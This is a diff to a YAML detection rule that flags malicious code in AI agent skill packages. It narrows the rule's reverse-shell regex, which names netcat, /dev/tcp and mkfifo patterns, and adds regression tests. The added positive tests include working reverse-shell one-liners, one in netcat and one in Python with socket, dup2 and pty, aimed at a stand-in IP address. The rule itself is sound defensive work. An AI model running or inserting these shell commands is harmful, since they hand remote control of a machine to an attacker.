@@ -1,6 +1,6 @@
 title: Malicious Code in Skill Package
 id: ATR-2026-00121
-rule_version: 1
+rule_version: 2
 status: experimental
 description: >
   Detects malicious code patterns in SKILL.md files and associated scripts. 100% of confirmed malicious skills contain
@@ -98,12 +98,16 @@ detection:
     - field: content
       operator: regex
       value: >-
-        (?i)(bash\s+-i\s+>&\s*/dev/tcp/|nc\s+-[a-zA-Z]*e[a-zA-Z]*\s|ncat\s+-[a-zA-Z]*e[a-zA-Z]*\b|ncat\s+--exec\b|mkfifo\s+/tmp/|python[3]?\s+-c\s+['"]import\s+(socket|os)|socat\s+exec)
+        (?i)(bash\s+-i\s+>&\s*/dev/tcp/|\bnc\s+-[a-zA-Z]*e[a-zA-Z]*\s|\bncat\s+-[a-zA-Z]*e[a-zA-Z]*\b|\bncat\s+--exec\b|mkfifo\s+/tmp/|python[3]?\s+-c\s+['"]import\s+(?:socket|os)\b[^\n]{0,300}?(?:\bdup2\s*\(|\bpty\b|\bsubprocess\b|\bos\.(?:system|popen\w*|exec\w*|spawn\w*|posix_spawn\w*)\s*\(|\b(?:eval|exec)\s*\()|socat\s+exec)
       description: >-
         Reverse shell (VirusTotal AMOS infostealer delivery). nc/ncat narrowed to require the -e/--exec flag
         (the actual exec-on-connect primitive) rather than any '-' flag or bare listen (-l/-p): 'ncat --proxy
         127.0.0.1:1080 --proxy-type socks5' (a legitimate SSH SOCKS ProxyCommand) and 'nc -l 9003' (a benign
-        local mock-TCP-server test fixture) both matched the old bare-flag pattern.
+        local mock-TCP-server test fixture) both matched the old bare-flag pattern. nc and ncat must start a
+        word: 'ffmpeg -f concat -safe 0' read as 'ncat -safe' and 'rsync -e ssh' as 'nc -e'. A python -c
+        one-liner that imports socket or os must also run something within 300 characters on the same line
+        (dup2, pty, subprocess, os.system, os.popen*, os.exec*, os.spawn*, os.posix_spawn*, eval or exec):
+        a DNS lookup ('socket.gethostbyname') or 'os.urandom' is not a shell.
     - field: content
       operator: regex
       value: (?i)(copy\s+.{0,30}(script|command|code).{0,30}paste.{0,30}(terminal|shell|console|cmd))
@@ -181,6 +185,16 @@ test_cases:
         (extract using pass: `openclaw`) and run the executable.
       expected: triggered
       matched_condition: Password-protected archive with embedded password
+    - input: nc -e /bin/sh 203.0.113.5 4444
+      expected: triggered
+      matched_condition: Reverse shell
+    - input: python3 -c 'import os; eval(code)'
+      expected: triggered
+      matched_condition: Reverse shell
+    - input: |-
+        python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("203.0.113.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'
+      expected: triggered
+      matched_condition: Reverse shell
   true_negatives:
     - input: Store your AWS credentials securely using environment variables, never in source code.
       expected: not_triggered
@@ -218,6 +232,24 @@ test_cases:
       description: >-
         REGRESSION (wild-scan 2026-07-12, orneryd/Mimir): ordinary local-dev default-credentials documentation,
         not a password-protected malicious archive; bare 'pass: value)' now requires a nearby archive extension.
+    - input: ffmpeg -f concat -safe 0 -i list.txt -c copy out.mp4
+      expected: not_triggered
+      description: >-
+        REGRESSION (skills.sh top-375 replay 2026-10-27): ffmpeg concat demuxer; 'concat -safe' contains
+        'ncat -safe' without any nc or ncat command.
+    - input: rsync -e ssh -avz ./build/ deploy@example.com:/srv/app/
+      expected: not_triggered
+      description: "rsync remote-shell option: 'rsync -e' contains 'nc -e' without any nc command."
+    - input: |-
+        ip=$(python3 -c "import socket,sys; print(socket.gethostbyname(sys.argv[1]))" "$host" 2>/dev/null)
+      expected: not_triggered
+      description: >-
+        REGRESSION (skills.sh top-375 replay 2026-10-27): DNS lookup in a connectivity-check script; the
+        one-liner imports socket but binds no shell to it.
+    - input: |-
+        SECRET_KEY=$(python3 -c "import os; print(os.urandom(32).hex())")
+      expected: not_triggered
+      description: "Secret generation one-liner: imports os and runs nothing."
 evasion_tests:
   - input: >-
       Ejecute el siguiente comando de inicialización:
